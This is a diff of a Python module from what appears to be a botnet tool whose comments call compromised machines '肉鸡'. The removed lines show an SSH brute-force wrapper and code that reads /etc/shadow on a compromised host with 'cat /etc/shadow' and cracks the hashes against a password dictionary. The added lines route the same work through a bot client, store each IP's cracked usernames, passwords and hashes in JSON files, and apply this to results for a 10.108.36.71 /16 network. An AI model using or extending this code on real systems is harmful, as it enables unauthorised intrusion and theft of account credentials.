@@ -5,73 +5,8 @@ __author__ = "riverchu"
 import os
 import json
 import global_var as gv
-import threading
-from brute import bruteSSH, bruteUnixPasswd
+from brute import bruteUnixPasswd
 from bot import botNet
-
-
-def brute(host, user, dictionary, *, connections):
-    """调用并进行破解
-
-    :param host:破解目标主机
-    :param user:目标用户
-    :param dictionary:字典路径
-    :param connections:连接数
-    :return:
-    """
-    target = (host, user)
-    dic = dict()
-    dic['passwd_file'] = dictionary
-    dic['max_connection'] = connections
-
-    brute_ret = bruteSSH.brute_ssh(*target, **dic)
-    return brute_ret
-
-
-def crack_bot_unix_passwd(ip, passwd_file_info):
-    if passwd_file_info is None or passwd_file_info == '':
-        return None
-
-    # 记录密码文件
-    pass_bruteinfo = dict()
-    pass_bruteinfo['ip'] = ip
-    pass_bruteinfo['account'] = {}
-    if passwd_file_info:
-        # 破解密码文件内密码
-        for line in passwd_file_info.split('\n'):
-            if len(line) < 4:
-                continue
-            passwd_info = bruteUnixPasswd.crack_unix_passwd(line, dic=gv.PASS_DICTIONARY)
-            if passwd_info['user'] != 'BannedUser':
-                pass_bruteinfo['account'][passwd_info['user']] = {}
-                pass_bruteinfo['account'][passwd_info['user']]['password'] = passwd_info['password']
-                pass_bruteinfo['account'][passwd_info['user']]['hash'] = line
-
-        save_info(mode='crack_unix_passwd', filename=gv.BOT_PATH + gv.bot_info_file, info=pass_bruteinfo, ip=ip)
-
-
-def get_unix_passwdfile(bot):
-    cmd_getpass = 'cat /etc/shadow'
-    passwd_file_info = bot.send_command(cmd_getpass)
-    return passwd_file_info
-
-
-def standard_operate_bot(bot, host):
-    """肉鸡标准操作
-
-    :param bot: class
-    :param host: host
-    :return:
-    """
-    if bot.connected is False:
-        return
-
-    # 破解unix密码
-    passwd_file_info = get_unix_passwdfile(bot)
-    t = threading.Thread(target=crack_bot_unix_passwd, args=(host, passwd_file_info))
-    bot.close()
-    t.start()
-    t.join()
 
 
 def operate_bot(brute_info):
@@ -83,8 +18,8 @@ def operate_bot(brute_info):
     brute_info.pop('time')
     bot = botNet.BotClient(**brute_info)
     bot.connect()
-    if bot.connected is True:
-        standard_operate_bot(bot, brute_info['host'])
+    bot.standard_operate()
+    save_info(mode='crack_unix_passwd', filename=gv.BOT_PATH + gv.bot_info_file, info=bot.password_json, ip=bot.host)
 
 
 def save_info(mode, filename, info, **kw):
@@ -106,14 +41,24 @@ def save_info(mode, filename, info, **kw):
             bot_info = json.load(open(filename, 'r'))
         else:
             bot_info = {}
+
         if 'ip' in kw:
             bot_info[info['ip']] = info
+            account_info = bot_info[info['ip']]['account']
+            for user in account_info:
+                if account_info[user]['hash'] != info['account'][user]['hash']:
+                    account_info[user]['hash'] = info['account'][user]['hash']
+                if account_info[user]['password'] != info['account'][user]['password']:
+                    account_info[user]['password'] = info['account'][user]['password']
+
         json.dump(bot_info, open(filename, 'w'), indent=4)
+    elif mode == 'update':
+        json.dump(info, open(filename, 'w'), indent=4)
     else:
         return None
 
 
-def read_files(filename, path=gv.BOT_PATH):
+def read_info(filename, path=gv.BOT_PATH):
     """读取原破解结果
 
     :param filename:
@@ -125,7 +70,41 @@ def read_files(filename, path=gv.BOT_PATH):
         return bot_info
 
 
+def combine_info(file1, file2, combined_file, input_path1=gv.BOT_PATH, input_path2=gv.BOT_PATH,
+                 output_path=gv.BOT_PATH):
+    info1 = None
+    info2 = None
+    timestamp1 = 0
+    timestamp2 = 0
+    if os.path.exists(input_path1 + file1):
+        info1 = json.load(open(input_path1 + file1, 'r'))
+        timestamp1 = os.path.getmtime(input_path1 + file1)
+    else:
+        print('[-] Error: file:' + file1 + ' does not exist.')
+        exit(-1)
+    if os.path.exists(input_path2 + file2):
+        info2 = json.load(open(input_path2 + file2, 'r'))
+        timestamp2 = os.path.getmtime(input_path2 + file2)
+    else:
+        print('[-] Error: file:' + file1 + ' does not exist.')
+        exit(-1)
+
+    output_info = None
+    if timestamp1 > timestamp2:
+        info2.update(info1)
+        info = info2
+    else:
+        info1.update(info2)
+        info = info1
+    json.dump(info, open(output_path + combined_file, 'w'), indent=4)
+
+
 if __name__ == '__main__':
-    mess = json.load(open(gv.BOT_PATH + gv.bot_info_file, 'r'))
-    # mess = read_files(bot_FILE)
-    print(json.dumps(mess, indent=4))
+    # mess = json.load(open(gv.BOT_PATH + gv.bot_info_file, 'r'))
+    info = read_info('10.108.36.71mask16.txt')
+    info = bruteUnixPasswd.update_passwd_json(info, dic=gv.PASS_DICTIONARY)
+    save_info(mode='update', filename=gv.BOT_PATH + '10.108.36.71mask16_new.txt', info=info)
+    # print(json.dumps(info, indent=4))
+    # combine_info(file1='10.108.36.71mask24.txt',
+    #              file2='10.108.36.71mask16.txt',
+    #              combined_file='10.108.36.71mask16.txt')
